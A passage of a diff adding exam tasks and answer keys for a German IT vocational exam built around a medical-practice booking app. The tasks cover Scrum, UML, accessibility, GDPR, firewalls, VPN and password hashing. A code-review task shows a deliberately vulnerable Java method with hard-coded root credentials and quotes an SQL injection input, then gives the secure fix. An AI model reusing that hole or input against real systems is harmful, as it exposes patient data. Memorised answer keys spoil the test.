+        sol: [['diagram', AP2.dg.cycle(['Sprint Planning', 'Entwicklung + Daily Scrum', 'Sprint Review', 'Retrospektive'], {w: 720, h: 300, rx: 230, ry: 100, styles: ['accent', 'ok', 'gold', 'cat3'], cap: 'Ein Sprint (2 Wochen) als Kreislauf; das Product Backlog speist jede Planung'})]],
+        see: ['ps-scrum']},
+      {pts: 6, rows: 8, topic: 'User Stories', q: 'Formulieren Sie zwei User Stories für TerminPlus nach dem üblichen Muster mit jeweils zwei **Akzeptanzkriterien**: a) Online-Buchung durch Patientinnen und Patienten, b) Terminerinnerung. Nennen Sie außerdem zwei Eigenschaften guter User Stories nach INVEST.',
+        a: ['a) **Als** Patientin **möchte ich** online einen freien Termin bei meiner Hausärztin buchen, **damit** ich nicht stundenlang telefonieren muss.', '- Akzeptanzkriterien: Es werden nur freie Termine der nächsten 6 Wochen angezeigt. Nach der Buchung erhalte ich innerhalb von 1 Minute eine Bestätigung per E-Mail. Ein Termin kann nicht doppelt vergeben werden.', 'b) **Als** Patient **möchte ich** 24 Stunden vor dem Termin erinnert werden, **damit** ich ihn nicht vergesse und rechtzeitig absagen kann.', '- Akzeptanzkriterien: Die Erinnerung geht über den gewählten Kanal (SMS oder E-Mail) raus. Sie enthält Datum, Uhrzeit, Praxis und einen Link zum Absagen. Bei abgesagten Terminen wird keine Erinnerung gesendet.', 'INVEST: **I**ndependent (unabhängig), **N**egotiable (verhandelbar), **V**aluable (wertvoll für Nutzer), **E**stimable (schätzbar), **S**mall (in einen Sprint passend), **T**estable (testbar, über Akzeptanzkriterien).'],
+        see: ['ps-scrum', 'ps-lastenheft']},
+      {pts: 4, topic: 'Burndown-Chart', q: 'Das Diagramm zeigt den Burndown des aktuellen Sprints (10 Arbeitstage, 40 Story Points) am Ende von Tag 7. Beurteilen Sie den Stand und nennen Sie zwei Maßnahmen, die im Sinne von Scrum angemessen sind.',
+        ctx: [['chart', {kind: 'line', w: 720, h: 300, labels: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'], series: [{n: 'Ideal', d: [40, 36, 32, 28, 24, 20, 16, 12, 8, 4, 0], k: 'text3', dash: '6 4'}, {n: 'Ist (verbleibende SP)', d: [40, 39, 36, 34, 33, 28, 26, 24, null, null, null], k: 'accent'}], ymax: 40, yl: 'verbleibende Story Points', cap: 'Sprint-Burndown TerminPlus, Sprint 6 (waagerecht: Arbeitstag)'}]],
+        a: ['Stand: An Tag 7 sind noch **24 SP** offen, ideal wären **12 SP**. Das Team liegt **12 SP zurück**. Bisher wurden 16 SP in 7 Tagen erledigt (rund 2,3 SP/Tag); in 3 Tagen schafft es voraussichtlich nur rund 7 SP. Das **Sprint-Ziel ist gefährdet**.', 'Maßnahmen: Im **Daily Scrum** die Hindernisse benennen, der **Scrum Master** beseitigt sie (zum Beispiel fehlender Zugang zur PVS-Schnittstelle). Mit dem **Product Owner** den **Umfang neu verhandeln** (niedrig priorisierte Stories zurück ins Product Backlog), ohne das Sprint-Ziel aufzugeben. In der **Retrospektive** die Ursachen klären (zu viel eingeplant, Schätzung). Nicht angemessen: dauerhafte Überstunden oder Qualität senken (Definition of Done).'],
+        see: ['ps-scrum']},
+      {pts: 3, topic: 'Velocity', q: 'Das Team hat in den letzten drei Sprints **34, 38 und 42 Story Points** abgeschlossen. Im Product Backlog sind noch **190 Story Points** geschätzt. Wie viele Sprints werden voraussichtlich noch benötigt?',
+        num: {c: 5, tol: 0, unit: 'Sprints'},
+        a: ['Durchschnittliche **Velocity** = (34 + 38 + 42) / 3 = **38 SP pro Sprint**. 190 / 38 = **5 Sprints**, also rund **10 Wochen**. Die Velocity ist ein Erfahrungswert des Teams und kein Leistungsmaßstab für Vergleiche zwischen Teams.'],
+        see: ['ps-scrum', 'ps-aufwand']},
+      {pts: 6, topic: 'Amortisation', q: 'TerminPlus kostet einmalig **96.000 Euro**. Durch weniger Telefonate und weniger nicht wahrgenommene Termine spart das MVZ monatlich **6.500 Euro**; für Betrieb und Lizenzen fallen monatlich **2.500 Euro** an. a) Berechnen Sie die Amortisationszeit in Monaten. b) Nennen Sie zwei nicht monetäre Vorteile, die in die Entscheidung einfließen sollten.',
+        a: ['a) Monatlicher Überschuss = 6.500 - 2.500 = **4.000 Euro**. Amortisationszeit = 96.000 / 4.000 = **24 Monate**.', 'b) Zufriedenere Patientinnen und Patienten (Buchung rund um die Uhr), Entlastung der Medizinischen Fachangestellten, besseres Image, Barrierefreiheit für Hörgeschädigte (keine Telefonpflicht), bessere Auslastung der Ärztinnen und Ärzte.', 'Bewertung: Überschuss 2 P, Ergebnis 2 P, zwei Vorteile 2 P.'],
+        sol: [['chart', {kind: 'line', w: 720, h: 300, labels: ['0', '6', '12', '18', '24', '30'], series: [{n: 'kumulierter Überschuss (Euro)', d: [-96000, -72000, -48000, -24000, 0, 24000], k: 'accent'}], ymin: -120000, ymax: 40000, yl: 'Euro', legend: true, cap: 'Die Kurve schneidet die Nulllinie nach 24 Monaten: Ab dann bringt TerminPlus Gewinn.'}], ['tool', 'roi']],
+        see: ['ps-kosten']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Modellieren und Oberfläche gestalten (25 Punkte)',
+    tasks: [
+      {pts: 9, rows: 10, topic: 'Klassendiagramm', q: 'Erstellen Sie ein UML-Klassendiagramm (Klassen, Attribute mit Datentypen, Beziehungen mit Multiplizitäten): Eine **Praxis** (Name, Adresse) besteht aus mindestens einem **Behandlungsraum** (Raumnummer); Räume existieren nicht ohne ihre Praxis. Eine **Ärztin bzw. ein Arzt** (LANR, Name, Fachrichtung) arbeitet in einer oder mehreren Praxen, jede Praxis hat mindestens einen Arzt. Ein **Termin** (Beginn, Dauer in Minuten, Status) gehört zu genau einem Arzt und genau einem **Patienten** (Versichertennummer, Name, Geburtsdatum) und findet in höchstens einem Raum statt. Ein **Videotermin** ist ein Termin mit zusätzlichem Link und ohne Raum.',
+        a: ['- Praxis **1** ◆ **1..*** Behandlungsraum (**Komposition**: Räume existieren nicht ohne Praxis).', '- Praxis **1..*** --- **1..*** Arzt (Assoziation, m:n).', '- Arzt **1** --- **0..*** Termin, Patient **1** --- **0..*** Termin.', '- Termin **0..*** --- **0..1** Behandlungsraum.', '- **Videotermin** erbt von Termin (Generalisierung) und hat - link: String.', 'Bewertung: Klassen mit Attributen und Typen 3 P, Beziehungen 2 P, Multiplizitäten 2 P, Komposition 1 P, Vererbung 1 P.'],
+        sol: [['diagram', {w: 880, h: 470, keep: 720, cap: 'Musterlösung: Klassendiagramm TerminPlus', nodes: [
+          {id: 'pr', k: 'cls', x: 130, y: 70, w: 210, t: {name: 'Praxis', attrs: ['- name: String', '- adresse: String']}},
+          {id: 'ra', k: 'cls', x: 130, y: 260, w: 210, t: {name: 'Behandlungsraum', attrs: ['- raumNr: String']}},
+          {id: 'ar', k: 'cls', x: 450, y: 70, w: 220, t: {name: 'Arzt', attrs: ['- lanr: String', '- name: String', '- fachrichtung: String']}},
+          {id: 'te', k: 'cls', x: 450, y: 260, w: 220, s: 'accent', t: {name: 'Termin', attrs: ['- beginn: DateTime', '- dauerMin: int', '- status: Terminstatus']}},
+          {id: 'pa', k: 'cls', x: 770, y: 260, w: 210, t: {name: 'Patient', attrs: ['- versichertenNr: String', '- name: String', '- geburtsdatum: Date']}},
+          {id: 'vi', k: 'cls', x: 450, y: 420, w: 220, t: {name: 'Videotermin', attrs: ['- link: String']}},
+        ], edges: [
+          {a: 'pr', b: 'ra', sa: 'diaf', ea: 'none', ta: '1', tb: '1..*'}, {a: 'pr', b: 'ar', ea: 'none', ta: '1..*', tb: '1..*'},
+          {a: 'ar', b: 'te', ea: 'none', ta: '1', tb: '0..*'}, {a: 'pa', b: 'te', ea: 'none', ta: '1', tb: '0..*'}, {a: 'te', b: 'ra', ea: 'none', ta: '0..*', tb: '0..1'},
+          {a: 'vi', b: 'te', ea: 'tri'},
+        ]}], ['tip', 'Lies Multiplizitäten immer **von der anderen Seite her**: "Ein Termin gehört zu genau **1** Arzt" steht am Arzt-Ende der Linie.']],
+        see: ['ps-klassen']},
+      {pts: 8, rows: 10, topic: 'Sequenzdiagramm', q: 'Erstellen Sie ein UML-Sequenzdiagramm für die Online-Buchung: Die Patientin wählt in der **App** einen Termin. Die App sendet die Buchung an die **API**. Die API fragt beim **Kalenderdienst** an, ob der Slot frei ist. **Ist er frei**, speichert die API den Termin in der **Datenbank**, beauftragt den **Mail-Service asynchron** mit der Bestätigung und meldet der App den Erfolg; die App zeigt die Bestätigung. **Ist er belegt**, meldet die API einen Konflikt mit Alternativterminen, die die App anzeigt.',
+        a: ['Lebenslinien: Patientin, App, API, Kalenderdienst, Datenbank, Mail-Service. Synchrone Nachrichten (gefüllte Pfeilspitze) mit Antworten (gestrichelt), die Mail als **asynchrone** Nachricht (offene Pfeilspitze). Die Verzweigung als **kombiniertes Fragment alt** mit den Wächtern [Slot frei] und [Slot belegt].', 'Bewertung: Lebenslinien 1 P, Nachrichtenfolge 3 P, Antworten 1 P, asynchrone Nachricht 1 P, alt-Fragment mit Wächtern 2 P.'],
+        sol: [['seq', {w: 920, actors: ['Patientin', 'App', 'API', 'Kalenderdienst', 'Datenbank', 'Mail-Service'], cap: 'Musterlösung: Die gestrichelte Linie trennt die Operanden des alt-Fragments. Offene Pfeilspitze = asynchron.', steps: [
+          [0, 1, 'Termin wählen', 's'], [1, 2, 'POST /termine', 's'], [2, 3, 'pruefeSlot(arzt, zeit)', 's'], [3, 2, 'frei / belegt', 'r'],
+          ['sep', 'alt [Slot frei]'], [2, 4, 'INSERT termin', 's'], [4, 2, 'OK', 'r'], [2, 5, 'Bestätigung senden', 'a'], [2, 1, '201 Created', 'r'], [1, 0, 'Bestätigung anzeigen', 'r'],
+          ['sep', '[Slot belegt]'], [2, 1, '409 Conflict + Alternativen', 'r'], [1, 0, 'Alternativen anzeigen', 'r']]}],
+          ['warn', 'Häufige Fehler: Antworten ohne gestrichelte Linie, Verzweigung als zwei getrennte Diagramme statt **alt-Fragment**, Datenbank direkt von der App aus ansprechen (Architekturfehler).']],
+        see: ['ps-sequenz']},
+      {pts: 8, rows: 9, topic: 'Barrierefreiheit und Ergonomie', q: 'Die Abbildung zeigt den ersten Entwurf des Buchungsformulars. Seit Juni 2025 gilt das **Barrierefreiheitsstärkungsgesetz (BFSG)** auch für Online-Terminbuchungen. a) Nennen Sie vier Mängel des Entwurfs und ordnen Sie jedem einen Grundsatz der Dialoggestaltung nach **DIN EN ISO 9241-110** oder ein WCAG-Prinzip zu. b) Nennen Sie je eine Verbesserung.',
+        ctx: [['result', {t: 'Entwurf Buchungsformular', h: 330, html: `<div class="f">
+  <h3>terminbuchung</h3>
+  <input placeholder="Name">
+  <input placeholder="Geb.-Dat.">
+  <input placeholder="Vers.-Nr.">
+  <select><option>Arzt wählen</option></select>
+  <div><span class="s g">08:00</span><span class="s r">08:15</span><span class="s g">08:30</span><span class="s r">08:45</span></div>
+  <div class="b"><button>OK</button><button>Löschen</button><button>Abbrechen</button></div>
+  <p class="e">Fehler 0x3F: Eingabe ungültig</p>
+</div>`, css: `.f { font-family: Arial, sans-serif; font-size: 11px; color: #a8a8a8; background: #fff; padding: 12px; width: 300px; border: 1px solid #eee; }
+.f h3 { margin: 0 0 6px; color: #bbb; font-weight: normal; }
+.f input, .f select { display: block; width: 100%; margin: 4px 0; font-size: 11px; color: #aaa; border: 1px solid #f0f0f0; padding: 3px; box-sizing: border-box; }
+.s { display: inline-block; padding: 4px 6px; margin: 4px 2px 4px 0; color: #fff; }
+.g { background: #3c3; } .r { background: #e33; }
+.b button { background: #ddd; border: 0; padding: 3px 8px; font-size: 10px; margin-right: 2px; }
+.e { color: #e33; margin: 6px 0 0; }`}]],
+        a: [['table', ['Mangel', 'Grundsatz / Prinzip', 'Verbesserung'], [['Nur Platzhalter, keine sichtbaren Beschriftungen (verschwinden beim Tippen, für Screenreader unklar)', 'Selbstbeschreibungsfähigkeit; WCAG: wahrnehmbar / verständlich', 'Sichtbare label-Elemente, mit dem Feld verknüpft (for/id)'], ['Freie und belegte Zeiten nur über Rot/Grün unterschieden', 'WCAG wahrnehmbar (Farbe nicht als einziges Merkmal)', 'Zusätzlich Text oder Symbol ("frei", durchgestrichen), belegte Zeiten deaktivieren'], ['Sehr geringer Kontrast, 11 px Schrift', 'WCAG wahrnehmbar (Kontrast mindestens 4,5 : 1)', 'Dunkler Text, mindestens 16 px, skalierbar'], ['Kryptische Fehlermeldung "0x3F"', 'Robustheit gegen Benutzungsfehler, Selbstbeschreibungsfähigkeit', 'Konkrete Meldung am Feld: "Bitte Geburtsdatum als TT.MM.JJJJ eingeben"'], ['"Löschen" direkt neben "OK", alle Knöpfe gleich gestaltet', 'Robustheit gegen Benutzungsfehler, Erwartungskonformität', 'Eindeutige Beschriftung "Termin buchen" als Primärknopf, Löschen mit Abstand und Rückfrage'], ['Datumsformat und Pflichtfelder unklar', 'Erwartungskonformität, Aufgabenangemessenheit', 'Format angeben, Pflichtfelder markieren, Datumsauswahl anbieten']]],
+          'Grundsätze nach ISO 9241-110 (2020): Aufgabenangemessenheit, Selbstbeschreibungsfähigkeit, Erwartungskonformität, Erlernbarkeit, Steuerbarkeit, Robustheit gegen Benutzungsfehler, Benutzerbindung. WCAG-Prinzipien: wahrnehmbar, bedienbar, verständlich, robust.', 'Bewertung: je Mangel mit Zuordnung 1 P, je Verbesserung 1 P.'],
+        sol: [['result', {t: 'Überarbeiteter Entwurf', h: 420, html: `<form class="f">
+  <h3>Termin buchen</h3>
+  <label for="n">Name *</label><input id="n" autocomplete="name">
+  <label for="g">Geburtsdatum * <small>(TT.MM.JJJJ)</small></label><input id="g" inputmode="numeric">
+  <label for="a">Ärztin / Arzt *</label><select id="a"><option>Dr. Yilmaz (Allgemeinmedizin)</option></select>
+  <fieldset><legend>Uhrzeit wählen</legend>
+    <button type="button" class="s">08:00 frei</button><button type="button" class="s" disabled>08:15 belegt</button><button type="button" class="s">08:30 frei</button>
+  </fieldset>
+  <p class="e" role="alert">Bitte geben Sie das Geburtsdatum im Format TT.MM.JJJJ ein.</p>
+  <button class="p">Termin verbindlich buchen</button> <button type="button" class="c">Abbrechen</button>
+</form>`, css: `.f { font: 16px/1.5 system-ui, sans-serif; color: #1a1a1a; max-width: 380px; }
+.f h3 { margin: 0 0 8px; } label { display: block; margin-top: 8px; font-weight: 600; } small { font-weight: 400; color: #444; }
+input, select { width: 100%; padding: 8px; font-size: 16px; border: 1px solid #555; border-radius: 6px; box-sizing: border-box; }
+fieldset { border: 1px solid #999; border-radius: 6px; margin: 10px 0; } .s { margin: 4px; padding: 6px 10px; border: 2px solid #1b5e20; background: #fff; border-radius: 6px; }
+.s:disabled { border-color: #999; color: #666; text-decoration: line-through; } .e { color: #b00020; font-weight: 600; }
+.p { background: #0b57d0; color: #fff; border: 0; padding: 10px 16px; border-radius: 6px; font-size: 16px; } .c { background: none; border: 0; text-decoration: underline; font-size: 16px; }`}]],
+        see: ['ps-ergonomie', 'ps-ux', 'ps-wireframe']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Datenschutz und Qualität sichern (25 Punkte)',
+    tasks: [
+      {pts: 6, topic: 'DSGVO Gesundheitsdaten', q: 'TerminPlus speichert neben Name und Termin auch den **Besuchsgrund** (zum Beispiel "Kontrolle Diabetes"). a) Um welche Datenkategorie handelt es sich, und was folgt daraus? b) Nennen Sie eine Rechtsgrundlage für die Verarbeitung. c) Welche Prüfung ist vor dem Start durchzuführen? d) Erklären Sie Privacy by Default an einem Beispiel aus TerminPlus.',
+        a: ['a) **Gesundheitsdaten**, eine **besondere Kategorie personenbezogener Daten** (Art. 9 DSGVO). Ihre Verarbeitung ist **grundsätzlich verboten**, außer eine Ausnahme nach Art. 9 Abs. 2 greift; es gelten erhöhte Schutzanforderungen (zum Beispiel Verschlüsselung, strenge Rollen).', 'b) **Ausdrückliche Einwilligung** (Art. 9 Abs. 2 a) für Zusatzfunktionen der App oder Verarbeitung für Zwecke der **Gesundheitsvorsorge und Behandlung** durch Personal mit Schweigepflicht (Art. 9 Abs. 2 h, in Verbindung mit dem Behandlungsvertrag).', 'c) Eine **Datenschutz-Folgenabschätzung** (DSFA, Art. 35), weil umfangreich besondere Kategorien verarbeitet werden; Einbindung des Datenschutzbeauftragten.', 'd) **Datenschutzfreundliche Voreinstellungen** (Art. 25): Der Besuchsgrund ist optional und standardmäßig leer; Erinnerungen enthalten keinen Besuchsgrund; Standortfreigabe und Newsletter sind ausgeschaltet, bis der Nutzer sie aktiviert.'],
+        see: ['ps-dsgvo', 'ps-tom']},
+      {pts: 6, topic: 'Schutzbedarf', q: 'Führen Sie für die drei Objekte eine **Schutzbedarfsfeststellung** nach BSI IT-Grundschutz durch (normal, hoch, sehr hoch je Grundwert Vertraulichkeit, Integrität, Verfügbarkeit) und begründen Sie jeweils den höchsten Wert: a) Terminkalender mit Besuchsgründen, b) Wartezimmeranzeige (zeigt Aufrufnummern), c) Server mit der TerminPlus-Datenbank.',
+        a: [['table', ['Objekt', 'Vertraulichkeit', 'Integrität', 'Verfügbarkeit', 'Begründung'], [['a) Terminkalender', '**sehr hoch**', 'hoch', 'hoch', 'Gesundheitsdaten (Art. 9), Offenlegung schadet Patienten erheblich; falsche Termine stören die Versorgung'], ['b) Wartezimmeranzeige', 'normal', 'normal', 'normal', 'nur Nummern, kein Personenbezug; Ausfall per Zuruf überbrückbar'], ['c) Datenbankserver', '**sehr hoch**', 'hoch', '**hoch**', '**Maximumprinzip**: erbt den höchsten Schutzbedarf der Anwendungen und Daten, die auf ihm laufen']]],
+          'Bewertung: je Objekt 2 P (plausible Einstufung mit Begründung). Abweichende Einstufungen sind mit guter Begründung zu akzeptieren.'],
+        see: ['infra-grundschutz', 'infra-cia']},
+      {pts: 7, rows: 9, topic: 'Code-Review', q: 'Im Code-Review finden Sie die folgende Methode. Nennen Sie vier Mängel (Sicherheit und Wartbarkeit) mit je einer Verbesserung und schreiben Sie die Datenbankabfrage sicher neu.',
+        ctx: [['code', 'java', `public List<Termin> t(String n) throws Exception {
+    Connection c = DriverManager.getConnection(
+        "jdbc:postgresql://db/praxis", "root", "Praxis2024!");
+    ResultSet r = c.createStatement().executeQuery(
+        "SELECT * FROM termin WHERE patient_name = '" + n + "'");
+    List<Termin> l = new ArrayList<>();
+    while (r.next()) {
+        if (r.getInt("status") == 3) continue;
+        l.add(new Termin(r.getInt(1), r.getTimestamp(4)));
+    }
+    return l;
+}`]],
+        a: [['table', ['Mangel', 'Verbesserung'], [['**SQL-Injection**: Benutzereingabe wird in den SQL-String eingebaut (Eingabe x\' OR \'1\'=\'1 liefert alle Termine)', '**PreparedStatement** mit Platzhalter (?)'], ['Zugangsdaten **im Quellcode**, Benutzer **root**', 'Konfiguration bzw. Secret-Store, eigener DB-Benutzer mit minimalen Rechten'], ['Verbindung und ResultSet werden **nicht geschlossen** (Ressourcenleck)', '**try-with-resources**, Connection-Pool'], ['**Magic Number** 3, Spaltenzugriff per Index, SELECT *', 'Konstante oder enum (Terminstatus.ABGESAGT), Spalten namentlich'], ['Nichtssagende Namen t, n, r, l; throws Exception', 'Sprechende Namen (findeTermineVonPatient, name, ergebnis), spezifische Exceptions']]],
+          ['code', 'java', `public List<Termin> findeOffeneTermine(String patientName) throws SQLException {
+    String sql = "SELECT termin_id, beginn FROM termin WHERE patient_name = ? AND status <> ?";
+    try (Connection con = dataSource.getConnection();
+         PreparedStatement ps = con.prepareStatement(sql)) {
+        ps.setString(1, patientName);
+        ps.setInt(2, Terminstatus.ABGESAGT.code());
+        try (ResultSet rs = ps.executeQuery()) {
+            List<Termin> termine = new ArrayList<>();
+            while (rs.next()) termine.add(new Termin(rs.getInt("termin_id"), rs.getTimestamp("beginn")));
+            return termine;
+        }
+    }
+}`], 'Bewertung: vier Mängel mit Verbesserung je 1,25 P, sichere Abfrage 2 P.'],
+        sol: [['ex', 'Was passiert bei der Eingabe **x\' OR \'1\'=\'1** ? Der zusammengesetzte Befehl lautet SELECT * FROM termin WHERE patient_name = \'x\' OR \'1\'=\'1\'. Die Bedingung ist immer wahr: Jeder sieht die Termine aller Patienten, ein schwerer Datenschutzverstoß.']],
+        see: ['infra-websec', 'eua-debugging', 'ps-softwarequalitaet']},
+      {pts: 6, topic: 'Teststrategie', q: 'a) Erläutern Sie die **Testpyramide** und begründen Sie die Verteilung der Testarten. b) Montags um 8 Uhr buchen erfahrungsgemäß bis zu **2.000 Personen gleichzeitig**. Welche Testart setzen Sie ein, und welche zwei Kennzahlen messen Sie?',
+        a: ['a) Unten **viele Unit-Tests** (schnell, billig, genaue Fehlerlokalisierung), in der Mitte **Integrations-/API-Tests**, oben **wenige End-to-End-/UI-Tests** (langsam, teuer, anfällig). Fehler sollen möglichst früh und günstig gefunden werden; alle Ebenen laufen automatisiert in der CI-Pipeline.', 'b) **Lasttest** (bzw. Performancetest; über die Grenze hinaus: **Stresstest**) mit simulierten 2.000 gleichzeitigen Nutzern. Kennzahlen: **Antwortzeit** (zum Beispiel 95 % der Anfragen unter 2 s), **Durchsatz** (Buchungen pro Sekunde), **Fehlerrate**, CPU- und Speicherauslastung.'],
+        sol: [['diagram', {w: 640, h: 230, cap: 'Testpyramide: je höher, desto weniger, langsamer und teurer', nodes: [
+          {id: 'e', k: 'box', x: 320, y: 40, w: 220, h: 50, t: ['End-to-End / UI', 'wenige'], s: 'bad'},
+          {id: 'i', k: 'box', x: 320, y: 105, w: 400, h: 50, t: ['Integration / API', 'einige'], s: 'gold'},
+          {id: 'u', k: 'box', x: 320, y: 170, w: 600, h: 50, t: ['Unit-Tests', 'viele, schnell, billig'], s: 'ok'},
+        ], edges: []}]],
+        see: ['ps-testarten', 'eua-unittest']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Infrastruktur und IT-Sicherheit (25 Punkte)',
+    tasks: [
+      {pts: 7, rows: 9, topic: 'DMZ und Firewall', q: 'Der Buchungsserver muss aus dem Internet erreichbar sein, die Datenbank und die Praxis-PCs dürfen es nicht. a) Skizzieren Sie eine Netzwerkarchitektur mit **DMZ** und zwei Firewalls. b) Formulieren Sie vier Firewallregeln (Quelle, Ziel, Dienst/Port, Aktion), einschließlich der Grundregel.',
+        a: ['a) Internet, **äußere Firewall**, **DMZ** mit Reverse Proxy/Webserver, **innere Firewall**, internes Netz mit Datenbankserver und Praxis-PCs. Zwei Firewalls verschiedener Hersteller erhöhen die Sicherheit (ein Fehler öffnet nicht beide).', ['table', ['Nr.', 'Quelle', 'Ziel', 'Dienst / Port', 'Aktion'], [['1', 'Internet (any)', 'Webserver DMZ', 'HTTPS, TCP 443', 'erlauben'], ['2', 'Webserver DMZ', 'DB-Server LAN', 'PostgreSQL, TCP 5432', 'erlauben'], ['3', 'Praxis-LAN', 'Webserver DMZ', 'HTTPS, TCP 443', 'erlauben'], ['4', 'Admin-Netz', 'Webserver DMZ', 'SSH, TCP 22', 'erlauben'], ['5', 'Internet', 'LAN', 'any', 'verweigern'], ['6', 'any', 'any', 'any', '**verweigern (Default Deny)**']]],
+          'Bewertung: Skizze 3 P, Regeln 4 P (Grundregel zwingend). Die Firewall arbeitet zustandsorientiert (Stateful Inspection), Antwortpakete sind automatisch erlaubt.'],
+        sol: [['diagram', {w: 880, h: 300, keep: 720, cap: 'DMZ zwischen zwei Firewalls: Aus dem Internet ist nur der Webserver erreichbar, nur er darf zur Datenbank.', nodes: [
+          {id: 'inet', k: 'oval', x: 70, y: 150, w: 110, h: 60, t: 'Internet', s: 'soft'},
+          {id: 'fw1', k: 'box', x: 220, y: 150, w: 110, h: 56, t: ['Firewall 1', 'außen'], s: 'bad'},
+          {id: 'dmz', k: 'group', x: 390, y: 150, w: 170, h: 200, t: 'DMZ'},
+          {id: 'web', k: 'box', x: 390, y: 115, w: 140, h: 50, t: ['Reverse Proxy', 'Webserver'], s: 'accent'}, {id: 'mail', k: 'box', x: 390, y: 195, w: 140, h: 44, t: 'Mail-Relay', s: 'soft'},
+          {id: 'fw2', k: 'box', x: 560, y: 150, w: 110, h: 56, t: ['Firewall 2', 'innen'], s: 'bad'},
+          {id: 'lan', k: 'group', x: 750, y: 150, w: 190, h: 240, t: 'LAN (intern)'},
+          {id: 'db', k: 'cyl', x: 750, y: 100, w: 140, h: 64, t: 'DB-Server', s: 'accent'}, {id: 'pc', k: 'box', x: 750, y: 200, w: 140, h: 44, t: 'Praxis-PCs', s: 'soft'},
+        ], edges: [{a: 'inet', b: 'fw1', ea: 'none', t: '443'}, {a: 'fw1', b: 'web', ea: 'none'}, {a: 'fw1', b: 'mail', ea: 'none'}, {a: 'web', b: 'fw2', ea: 'none'}, {a: 'fw2', b: 'db', ea: 'none', t: '5432'}, {a: 'fw2', b: 'pc', ea: 'none'}]}]],
+        see: ['infra-firewall']},
+      {pts: 6, topic: 'VPN', q: 'Die 9 Praxen sollen sicher an das Rechenzentrum angebunden werden; Ärztinnen und Ärzte sollen außerdem aus dem Homeoffice Befunde einsehen können. a) Welche VPN-Arten setzen Sie jeweils ein? b) Beschreiben Sie, wie IPsec im Tunnelmodus Vertraulichkeit, Integrität und Authentizität sicherstellt. c) Welche zusätzliche Maßnahme ist für den Homeoffice-Zugang zwingend?',
+        a: ['a) Praxen: **Site-to-Site-VPN** (Router/Firewall der Praxis zum Rechenzentrum, dauerhaft, für die Nutzer unsichtbar). Homeoffice: **Client-to-Site-VPN** (Remote Access, VPN-Client auf dem Dienstgerät).', 'b) Im **Tunnelmodus** wird das komplette ursprüngliche IP-Paket mit **ESP verschlüsselt** (Vertraulichkeit, zum Beispiel AES-GCM) und in ein neues IP-Paket verpackt; ein **HMAC/AEAD-Tag** sichert die **Integrität**; die Gegenstellen authentisieren sich beim Schlüsselaustausch (**IKEv2**) mit **Zertifikaten** oder Pre-Shared Key (Authentizität). Die Schlüssel werden per Diffie-Hellman ausgehandelt.', 'c) **Zwei-Faktor-Authentisierung** (zum Beispiel Zertifikat auf dem Gerät plus TOTP-App), dazu nur verwaltete Dienstgeräte mit aktuellem Patchstand.'],
+        sol: [['diagram', {w: 760, h: 300, keep: 620, cap: 'Hub-and-Spoke: jede Praxis mit einem IPsec-Tunnel zum Rechenzentrum, Homeoffice per Client-VPN mit 2FA', nodes: [
+          {id: 'rz', k: 'cyl', x: 380, y: 150, w: 150, h: 80, t: ['Rechenzentrum', 'VPN-Gateway'], s: 'accent'},
+          {id: 'p1', k: 'box', x: 100, y: 60, w: 120, h: 44, t: 'Praxis 1'}, {id: 'p2', k: 'box', x: 100, y: 150, w: 120, h: 44, t: 'Praxis 2'}, {id: 'p3', k: 'box', x: 100, y: 240, w: 120, h: 44, t: 'Praxis ... 9'},
+          {id: 'ho', k: 'box', x: 660, y: 150, w: 150, h: 50, t: ['Homeoffice', 'Laptop + 2FA'], s: 'gold'},
+        ], edges: [{a: 'p1', b: 'rz', k: 'dash', ea: 'none', t: 'IPsec'}, {a: 'p2', b: 'rz', k: 'dash', ea: 'none', t: 'IPsec'}, {a: 'p3', b: 'rz', k: 'dash', ea: 'none', t: 'IPsec'}, {a: 'ho', b: 'rz', k: 'dash', ea: 'none', t: 'Client-VPN'}]}]],
+        see: ['infra-vpn']},
+      {pts: 6, topic: 'Passwörter speichern', q: 'Patientinnen und Patienten melden sich mit E-Mail und Passwort an. a) Beschreiben Sie, wie die Passwörter sicher gespeichert werden (Verfahren, Salt, Algorithmus). b) Warum sind schnelle Hashfunktionen wie SHA-256 allein ungeeignet, und warum werden Passwörter nicht verschlüsselt gespeichert?',
+        a: ['a) Gespeichert wird nur ein **Hashwert**: Für jedes Passwort wird ein **zufälliges Salt** (individuell, mindestens 16 Byte) erzeugt; daraus und aus dem Passwort berechnet ein **langsamer, speicherintensiver Passwort-Hash** (**Argon2id**, bcrypt, scrypt oder PBKDF2) den Hash. Gespeichert werden Salt, Parameter und Hash. Beim Login wird der Hash mit demselben Salt neu berechnet und verglichen. Optional zusätzlich ein geheimer **Pepper** außerhalb der Datenbank.', 'b) SHA-256 ist **zu schnell**: Angreifer testen mit Grafikkarten Milliarden Passwörter pro Sekunde (Brute Force, Wörterbuch). Ohne Salt helfen außerdem **Rainbow Tables**, und gleiche Passwörter haben gleiche Hashes. **Verschlüsselung** ist umkehrbar: Wer den Schlüssel erbeutet, kennt alle Passwörter. Ein Hash ist eine Einwegfunktion.'],
+        sol: [['diagram', AP2.dg.flow(['Passwort "Sonne#2026"', '+ zufälliges Salt', 'Argon2id (langsam, viel Speicher)', 'DB: Salt + Parameter + Hash'], {w: 780, h: 110, styles: ['plain', 'gold', 'accent', 'ok'], bw: 175, cap: 'Registrierung: gespeichert wird nie das Passwort selbst'})], ['tool', 'hash']],
+        see: ['infra-krypto', 'infra-webauth']},
+      {pts: 4, topic: 'Verfügbarkeit', q: 'Der Buchungsdienst besteht aus einer Kette: Router (99,9 %), Firewall (99,95 %), **zwei parallel betriebene Webserver** (je 99 %, einer genügt) und Datenbankserver (99,8 %). Berechnen Sie die Gesamtverfügbarkeit in Prozent (zwei Nachkommastellen).',
+        num: {c: 99.64, tol: 0.006, unit: '%'},
+        a: ['Parallel: 1 - (1 - 0,99)² = 1 - 0,0001 = **0,9999**.', 'Seriell: 0,999 x 0,9995 x 0,9999 x 0,998 = **0,99640** ≈ **99,64 %**.', 'Merke: In Reihe wird **multipliziert** (die Kette ist schwächer als ihr schwächstes Glied), parallel werden die **Ausfallwahrscheinlichkeiten** multipliziert.'],
+        sol: [['diagram', {w: 820, h: 200, keep: 680, cap: 'Zuverlässigkeitsblockdiagramm: Reihe mit einem Parallelblock', nodes: [
